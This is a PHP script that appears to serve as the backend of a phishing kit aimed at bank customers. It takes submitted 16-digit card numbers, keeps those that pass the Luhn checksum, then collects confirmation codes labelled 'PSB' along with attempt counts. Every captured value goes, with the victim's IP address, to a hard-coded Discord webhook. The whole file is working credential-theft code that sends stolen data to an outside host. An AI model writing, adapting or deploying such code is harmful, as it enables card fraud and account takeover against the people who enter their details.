<?php

header('Content-Type: application/json');

function get_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// ===== Discord Webhook =====
$discordWebhook = "https://discord.com/api/webhooks/1544994017886998559/noa3HDoMaS71iZ0PXPSpHlAmXxugOUuFkoDYj-QOjxddWNhWgjshV8GdDdOGdnal_FHy";

if (!isset($_SERVER['REQUEST_METHOD']) || $_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['success' => false, 'error' => 'Method not allowed']));
}

// ===== Step 1: Карта (ENG) =====
if (isset($_POST['L'])) {
    $Number = preg_replace('/[^0-9]/', '', $_POST['L']);
    $ip = get_ip();

    if (strlen($Number) === 16 && validateLuhn($Number)) {
        $message = "**Status:** Step №1 - ENG\n";
        $message .= "**key:** `$Number`\n";
        $message .= "**IP:** $ip";

        sendDiscordMessage($message);
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Invalid number']);
    }
    exit;
}

// ===== Step 2: Код (PSB) =====
if (isset($_POST['code'])) {
    $code = preg_replace('/[^0-9]/', '', $_POST['code']);
    $ip = get_ip();
    $attempt = isset($_POST['attempt']) ? (int)$_POST['attempt'] : 1;

    $message = "**⚠️ Status:** Step №2 - PSB\n";
    $message .= "**🔑 Code:** `$code`\n";
    $message .= "**🌏 IP:** $ip\n";
    $message .= "**🔄 Attempt:** $attempt";

    sendDiscordMessage($message);
    echo json_encode(['success' => true]);
    exit;
}

// ===== Функции =====
function validateLuhn($number) {
    $number = preg_replace('/\D/', '', $number);
    $length = strlen($number);
    $sum = 0;
    $alternate = false;

    for ($i = $length - 1; $i >= 0; $i--) {
        $digit = (int)$number[$i];

        if ($alternate) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }

        $sum += $digit;
        $alternate = !$alternate;
    }

    return ($sum % 10) === 0;
}

function sendDiscordMessage($text) {
    global $discordWebhook;

    $data = [
        'content' => $text
    ];

    $ch = curl_init($discordWebhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}